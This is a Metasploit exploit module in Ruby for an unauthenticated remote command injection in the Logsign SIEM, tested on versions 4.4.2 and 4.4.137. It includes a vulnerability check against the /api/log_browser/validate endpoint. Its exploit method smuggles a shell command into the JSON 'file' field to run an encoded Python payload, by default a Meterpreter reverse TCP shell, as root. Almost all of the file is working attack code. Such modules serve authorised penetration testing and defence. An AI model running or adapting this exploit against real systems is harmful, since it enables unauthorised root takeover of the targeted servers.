##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Logsign Remote Command Injection',
      'Description'    => %q{
        This module exploits an command injection vulnerability in Logsign.
        By exploiting this vulnerability, unauthenticated users can execute
        arbitrary code under the root user.

        Logsign has a publicly accessible endpoint. That endpoint takes a user
        input and then use it during operating system command execution without
        proper validation.

        This module was tested against 4.4.2 and 4.4.137 versions.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Mehmet Ince <mehmet@mehmetince.net>'  # author & msf module
        ],
      'References'      =>
        [
          ['URL', 'https://pentest.blog/unexpected-journey-3-visiting-another-siem-and-uncovering-pre-auth-privileged-remote-code-execution/']
        ],
      'Privileged'      => true,
      'Platform'        => ['python'],
      'Arch'            => ARCH_PYTHON,
      'DefaultOptions'  =>
        {
          'payload' => 'python/meterpreter/reverse_tcp'
        },
      'Targets'         => [ ['Automatic', {}] ],
      'DisclosureDate'  => 'Feb 26 2017',
      'DefaultTarget'   => 0
    ))

  end

  def check
    p_hash = {:file => "#{rand_text_alpha(15 + rand(4))}.raw"}

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'log_browser', 'validate'),
      'ctype' => 'application/json',
      'data' => JSON.generate(p_hash)
    )

    if res && res.body.include?('{"message": "success", "success": true}')
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_status("Delivering payload...")

    p_hash = {:file => "logsign.raw\" quit 2>&1 |python -c \"#{payload.encoded}\" #"}

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'log_browser', 'validate'),
      'ctype' => 'application/json',
      'data' => JSON.generate(p_hash)
    )
  end
end